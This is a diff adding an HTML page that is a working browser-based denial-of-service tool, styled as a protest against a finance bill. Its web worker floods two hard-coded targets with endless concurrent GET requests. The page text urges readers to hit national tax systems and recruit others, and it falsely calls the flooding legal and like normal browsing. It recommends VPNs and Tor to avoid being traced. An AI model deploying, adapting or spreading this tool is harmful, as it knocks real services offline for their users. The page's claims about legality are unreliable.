@@ -1,0 +1,299 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+  <title>SHUT IT DOWN</title>
+  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <style>
+    .btn {
+      @apply py-2 px-4 bg-blue-500 text-white font-semibold rounded-lg shadow-md hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-400 focus:ring-opacity-75;
+    }
+    .modal {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.5);
+      z-index: 1000;
+      overflow-y: auto;
+    }
+    .modal-content {
+      background-color: #fff;
+      padding: 20px;
+      border-radius: 5px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+      max-width: 90%;
+      width: 500px;
+      margin: 20px;
+    }
+    .modal-header,
+    .modal-body,
+    .modal-footer {
+      padding: 10px;
+    }
+    .status-table {
+      width: 100%;
+      table-layout: fixed;
+      word-wrap: break-word;
+    }
+    .status-table td {
+      padding: 5px;
+    }
+  </style>
+  <script>
+    let worker;
+    const urls = ['https://www.sportpesanews.com', 'https://196.13.121.8/'];
+
+    function getPublicIP() {
+      $.getJSON("https://api.ipify.org?format=json", function(data) {
+        $("#userip").html(data.ip);
+      });
+    }
+
+    function openModal() {
+      document.getElementById('warning-modal').style.display = 'flex';
+    }
+
+    function closeModal() {
+      document.getElementById('warning-modal').style.display = 'none';
+      startAttack();
+    }
+
+    function startAttack() {
+      const workerScript = `
+        let attack = false;
+        let queue = [];
+        let urls = ${JSON.stringify(urls)};
+        let targets = urls.reduce((o, key) => ({ ...o, [key]: {number_of_requests: 0, number_of_errored_responses: 0, last_request_time: Date.now()}}), {});
+        let totalrequests = 0;
+        let totalerrors = 0;
+        let lastSecondRequests = 0;
+        let lastSecondErrors = 0;
+        let dataTransferred = 0;
+
+        onmessage = function(e) {
+          if (e.data === 'start') {
+            attack = true;
+            startFlooding();
+          } else if (e.data === 'stop') {
+            attack = false;
+          }
+        };
+
+        async function fetchWithTimeout(resource, options) {
+          const controller = new AbortController();
+          const id = setTimeout(() => controller.abort(), options.timeout);
+          return fetch(resource, {
+            signal: controller.signal,
+            mode: 'no-cors'
+          }).then(response => {
+            clearTimeout(id);
+            return response;
+          }).catch(error => {
+            clearTimeout(id);
+            throw error;
+          });
+        }
+
+        async function sleep(ms) {
+          return new Promise(resolve => setTimeout(resolve, ms));
+        }
+
+        async function flood(n) {
+          const url = urls[n];
+          const target = targets[url];
+          while (attack) {
+            if (queue.length > 1200) { // Increased concurrency limit
+              await Promise.all(queue.slice(0, 100)); // Clear out faster
+              queue.splice(0, 100);
+            }
+            const requestTime = Date.now();
+            queue.push(
+              fetchWithTimeout(url, { timeout: 1000 })
+                .catch(error => {
+                  if (error.name === 'AbortError') {
+                    return;
+                  }
+                  target.number_of_errored_responses++;
+                  totalerrors++;
+                  lastSecondErrors++;
+                  postMessage({ totalrequests, totalerrors, lastSecondRequests, lastSecondErrors, dataTransferred, targets });
+                })
+                .then(response => {
+                  if (response && !response.ok) {
+                    target.number_of_errored_responses++;
+                    totalerrors++;
+                    lastSecondErrors++;
+                  }
+                  target.number_of_requests++;
+                  totalrequests++;
+                  lastSecondRequests++;
+                  dataTransferred += 0.001; // Increment data transferred
+                  postMessage({ totalrequests, totalerrors, lastSecondRequests, lastSecondErrors, dataTransferred, targets });
+                })
+            );
+            await sleep(0);
+          }
+        }
+
+        function startFlooding() {
+          for (let i = 0; i < urls.length; i++) {
+            for (let j = 0; j < 4; j++) { // Quadrupled the number of concurrent requests per URL
+              flood(i);
+            }
+          }
+        }
+
+        setInterval(() => {
+          postMessage({ lastSecondRequests, lastSecondErrors, dataTransferred, targets });
+          lastSecondRequests = 0;
+          lastSecondErrors = 0;
+        }, 1000); // Update every second
+      `;
+      const blob = new Blob([workerScript], { type: 'application/javascript' });
+      worker = new Worker(URL.createObjectURL(blob));
+      worker.postMessage('start');
+      worker.onmessage = function(event) {
+        const { totalrequests, totalerrors, lastSecondRequests, lastSecondErrors, dataTransferred, targets } = event.data;
+        document.querySelector("#totalrequests").innerText = totalrequests;
+        document.querySelector("#totalerrors").innerText = totalerrors;
+        document.querySelector("#requestsPerSecond").innerText = lastSecondRequests;
+        document.querySelector("#successPerSecond").innerText = lastSecondRequests - lastSecondErrors;
+        document.querySelector("#errorsPerSecond").innerText = lastSecondErrors;
+        document.querySelector("#betabox .number-counter").innerText = Math.floor(dataTransferred);
+        
+        Object.keys(targets).forEach((url, n) => {
+          var requests_cell = document.querySelector(`#target${n} .requests`);
+          var errors_cell = document.querySelector(`#target${n} .errors`);
+          requests_cell.innerText = targets[url].number_of_requests;
+          errors_cell.innerText = targets[url].number_of_errored_responses;
+        });
+      };
+      document.querySelector("div.desc .btn").innerText = "Pause";
+    }
+
+    function togglePause() {
+      if (worker) {
+        worker.postMessage('stop');
+        worker.terminate();
+        worker = null;
+        document.querySelector("div.desc .btn").innerText = "Resume";
+      } else {
+        startAttack();
+      }
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+      getPublicIP();
+      var statRow = document.querySelector("#stats > .flex");
+      urls.sort(() => 0.5 - Math.random());
+      urls.forEach((url, index) => {
+        statRow.innerHTML += `
+          <div class="p-2 w-full sm:w-1/2 md:w-1/3 lg:w-1/4" id="target${index}">
+            <h7><u><i>${url}</i></u></h7>
+            <table class='status-table'>
+              <tr><td>requests:</td><td class="requests">0</td></tr>
+              <tr><td>errors:</td><td class="errors">0</td></tr>
+            </table>
+          </div>
+        `;
+      });
+
+      document.body.innerHTML += `
+        <div class="text-center my-4">
+          <h2 class="text-2xl font-bold">Requests Per Second: <span id="requestsPerSecond">0</span></h2>
+          <h2 class="text-2xl font-bold">Successful Requests Per Second: <span id="successPerSecond">0</span></h2>
+          <h2 class="text-2xl font-bold">Failed Requests Per Second: <span id="errorsPerSecond">0</span></h2>
+        </div>
+      `;
+    });
+  </script>
+</head>
+<body class="bg-gradient-to-b from-blue-700 to-yellow-400 text-black" onload="openModal()">
+  <div id="warning-modal" class="modal">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h5 class="text-red-600 font-bold flex items-center">
+          <img class="mr-2" src="https://i.imgur.com/no4Noob.jpeg" draggable="false" width="50px" alt="UKR">
+          Warning: <span class="text-red-500 ml-2">Read before you continue.</span>
+        </h5>
+      </div>
+      <div class="modal-body text-gray-700">
+        <p>As you may be aware, participating in cyber-attacks is illegal and generally advised against for valid reasons.</p>
+        <hr class="my-2">
+        <p>Click "Continue" if you have a VPN, Proxy, or the Tor browser and wish to actively engage in lawful digital protests against the recent bill. Recommended VPN services include NordVPN and ProtonVPN, known for their security and privacy protections.</p>
+        <hr class="my-2">
+        <p>This method involves sending repeated GET requests to targeted websites, simulating a high volume of traffic. This is legal and comparable to regular internet browsing, yet it's crucial to prioritize safety by using secure connections.</p>
+        <hr class="my-2">
+        <p class="font-bold">We fight for our rights we fight for freedom: </p>
+        <p>We will target all taxation systems in the country, from KRA to Kanjo. By doing this, we will interrupt the government's source of income. The sooner we act, the better. For us to be effective, we need more participants. Tell a friend to tell a friend.</p>
+        <div class="flex justify-between items-center mt-3">
+          <a href="#" class="text-blue-500 underline">Channel</a>
+          <a href="#" class="text-blue-500 underline">Chat</a>
+          <a href="#" class="text-blue-500 underline">Website</a>
+        </div>
+        <p class="font-bold mt-2">Additional message for newly added targets:</p>
+        <p>To keep up with targets, we're going to use our X handles. Also, if you are a developer, you could help us by adding a drop box to upload URL lists in TXT format or an input field.</p>
+      </div>
+      <div class="modal-footer flex justify-end">
+        <button class="btn mr-2" onclick="window.location.href='#'">Leave</button>
+        <button class="btn" onclick="closeModal()">Continue</button>
+      </div>
+    </div>
+  </div>
+  <div class="bg-blue-700 p-4 text-white text-center">
+    <div class="flex justify-between items-center">
+      <div class="flex-1">
+        <span class="font-bold">Info:</span> Your Public IP Address is: <span id="userip" class="inline-block">Loading..</span>
+      </div>
+      <div class="flex-1 text-right">
+        <span>For privacy, download the Tor Browser:</span> <a href="https://www.torproject.org/download/" target="_blank" class="underline text-blue-300">https://www.torproject.org/download/</a>
+      </div>
+    </div>
+    <h1 class="text-4xl font-bold text-red-600 mt-4">#REJECTFINANCE BILL</h1>
+  </div>
+  <div class="bg-blue-600 text-center text-white py-2">
+    <h3 class="text-xl underline">Information about this tool.</h3>
+  </div>
+  <div class="max-w-4xl mx-auto p-4 text-white">
+    <p>This tool is open source and available for modification by anyone. You can download it for local use and customization <a href="https://raw.githubusercontent.com/helpukr/helpukr.github.io/main/day805.htm" target="_blank" class="underline text-yellow-300">here</a> from our GitHub repository. It can be run locally or through hosted platforms such as <a href="https://pages.github.com/" target="_blank" class="underline text-yellow-300">GitHub Pages</a>.</p>
+    <p>The tool is designed to generate a significant load on selected targets each day. Simply open this page on any device and leave it running as long as possible to contribute effectively.</p>
+    <details class="my-4">
+      <summary class="text-yellow-300">Click Here for <b>FAQ</b> <i>(Questions & Answers)</i></summary>
+      <div class="p-2">
+        <hr class="border-white">
+        <p class="mt-2"><span class="text-yellow-300 font-bold">Q)</span> How can I use this in the tor browser if HTTPS overrides HTTP no matter what I try?<br>
+        <span class="text-yellow-300 font-bold">A)</span> Download the page for local use, it won't use any http/https protocols because those are used to request files from a web server, but using it locally (directly from your computer) bypasses the need and allows you to flood both HTTP and HTTPS from your TOR Browser's IP.</p>
+        <p class="mt-2"><span class="text-yellow-300 font-bold">Q)</span> After so much time has passed, my browser/computer become very laggy and unresponsive or my browser crashes, how can I fix this?<br>
+        <span class="text-yellow-300 font-bold">A)</span> This can be solved by either restarting your machine or exiting the page for some time. You can also pause the attacks using the pause button on our page.</p>
+        <p class="mt-2"><span class="text-yellow-300 font-bold">Q)</span> Why are some of the requests having the same number error after a while?<br>
+        <span class="text-yellow-300 font-bold">A)</span> This is likely caused by the IP of the VPN you're using has been blocked on their side, but it could also mean the site's just totally overloaded and cannot respond to any requests. Also if you’re are using https:// in the address bar that would cause the http:// addresses to do the same.</p>
+      </div>
+    </details>
+  </div>
+  <div class="bg-blue-700 p-4 text-white text-center">
+    <h3 class="text-2xl">Session Status</h3>
+    <p class="mt-2">Below is a log of sites that either responded with errors or failed to respond at all. It’s normal for this number to count up slow or fast and can often change. If a lot of services are overloaded the numbers will go fast, else they’ll go slower. If all requests are the same as all errors on some sites, it most likely means that the site operator has banned the IP you’re using.</p>
+  </div>
+  <div class="desc text-center p-4">
+    <p class="text-xs">Total number of requests: <span id="totalrequests">0</span></p>
+    <p>So far <span id="totalerrors"><em>zero</em></span> sites have responded with errors</p>
+    <button type="button" class="btn py-2 px-8" onclick="togglePause();">Resume</button>
+  </div>
+  <div id="stats" class="container mx-auto p-4">
+    <div class="flex flex-wrap justify-center"></div>
+  </div>
+  <div class="footer text-center py-4">
+    <div id="betabox" class="mx-auto w-11/12 md:w-1/2 p-2 border-t border-b border-blue-700 bg-yellow-300">
+      <strong><em><u>Estimate</u>:</em></strong> data requested from servers via GET: <span class="number-counter" data-count-from="0" data-count-to="1000000000000" data-count-speed="0.03">0</span>MB (MegaBytes)
+    </div>
+  </div>
+</body>
+</html>
